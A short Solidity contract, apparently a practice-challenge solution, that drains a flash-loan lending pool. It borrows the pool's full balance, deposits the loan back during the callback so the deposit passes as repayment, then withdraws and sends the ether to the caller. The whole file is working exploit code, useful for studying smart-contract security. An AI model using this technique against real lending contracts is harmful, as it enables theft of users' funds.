// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface SideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external payable;

    function flashLoan(uint256) external;
}

contract FlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(address _address) {
        pool = SideEntranceLenderPool(_address);
    }

    function exploit() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
